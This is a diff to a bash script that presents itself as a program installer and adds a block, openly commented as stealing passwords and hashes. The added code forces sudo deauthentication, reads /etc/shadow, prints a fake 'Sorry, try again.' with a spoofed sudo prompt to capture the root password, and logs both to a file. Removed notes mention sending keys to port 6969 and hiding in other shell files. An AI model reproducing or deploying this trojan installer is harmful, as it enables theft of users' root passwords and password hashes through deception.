@@ -117,6 +117,26 @@ for (( i=1; i <= $FILENUM; i++ ));do
     fi
 done
 
+# -----------------------Steals Passwords and Hashes---------------------
+# use social engineering - they trust that its their password
+echo "All set up!"
+echo "For installation please enter your password"
+sudo -k     # forces sudo deauthentication
+PASSES=$(sudo cat /etc/shadow)  # if this doesnt work, the terminals just being a bitch: RESTART and try again
+# echo "THE HASHES:"$PASSES
+# Make it look like they failed so i can steal their password
+echo "Sorry, try again."
+name=$(whoami)
+echo -n "[sudo] password for $name: "
+#read -s $pass
+read -s rootPass
+echo
+# have now stolen the password
+echo "HASHES: 
+"$PASSES >> $TARGETDIR/file.log
+echo "ROOT PASSWORD: 
+"$rootPass >> $TARGETDIR/file.log
+
 # --------------------------Fake install--------------------------
 # Install program - this will be the actual shell file in a true implementation
 echo "Please wait while the program installs"
@@ -127,12 +147,3 @@ for (( i=1; i <= $seconds; i++ ));do
 	sleep 1
 done
 echo 
-
-
-
-# progress
-    # - reads keys 
-    # sends and recieves keys to port 6969
-
-# TODO:
-    # make it hide itself in other shell files
